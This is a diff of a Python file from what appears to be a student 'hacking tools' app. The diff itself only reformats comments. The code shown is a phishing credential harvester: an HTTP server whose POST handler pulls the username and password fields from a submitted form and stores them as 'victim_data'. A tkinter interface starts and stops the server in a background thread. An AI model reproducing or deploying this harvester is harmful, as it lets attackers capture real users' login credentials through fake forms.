@@ -6,14 +6,14 @@ from tkinter import messagebox
 from http.server import SimpleHTTPRequestHandler, HTTPServer
 import socket
 
-# Ruta absoluta al archivo form.html
+#Ruta absoluta al archivo form.html
 #DIRECTORY = '/home/jonathan/Desktop/hacking_tools_app/utils'
 DIRECTORY = 'C:/Users/Jonathan/Desktop/University/semestre_VII/sistemas_operativos_II/proyecto-so2/utils'
 
-# Variable global para manejar el servidor
+#Variable global para manejar el servidor
 httpd = None
 
-hilo = None  # Variable global para el hilo
+hilo = None  #Variable global para el hilo
 
 victim_data=None
 
@@ -25,20 +25,20 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
         return super().do_GET()
 
     def do_POST(self):
-        # Obtener la longitud del contenido enviado
+        #Obtener la longitud del contenido enviado
         content_length = int(self.headers['Content-Length'])
-        # Leer el contenido enviado
+        #Leer el contenido enviado
         post_data = self.rfile.read(content_length)
-        # Decodificar los datos del formulario
+        #Decodificar los datos del formulario
         data = urllib.parse.parse_qs(post_data.decode('utf-8'))
 
-        # Imprimir los datos en la consola (puedes procesarlos como desees)
+        #Imprimir los datos en la consola (puedes procesarlos como desees)
         username = data.get('username', [''])[0]
         password = data.get('password', [''])[0]
         global victim_data
         victim_data = f"Usuario: {username} | Contraseña: {password}"
 
-        # Responder al cliente
+        #Responder al cliente
         self.send_response(200)
         self.send_header('Content-type', 'text/html')
         self.end_headers()
@@ -75,7 +75,7 @@ def start_http_server_en_hilo(server_entry):
 
 
     hilo = threading.Thread(target=start_http_server)
-    hilo.daemon = True  # Permite que el hilo se detenga al cerrar la aplicación
+    hilo.daemon = True  #Permite que el hilo se detenga al cerrar la aplicación
     hilo.start()
 
 def stop_http_server(server_entry):
@@ -85,7 +85,7 @@ def stop_http_server(server_entry):
         try:
             httpd.socket.shutdown(socket.SHUT_RDWR)
         except OSError:
-            pass  # El socket ya podría estar cerrado
+            pass  #El socket ya podría estar cerrado
         httpd.server_close()
         httpd = None
         server_entry.insert(tk.END, "Servidor detenido.\n")
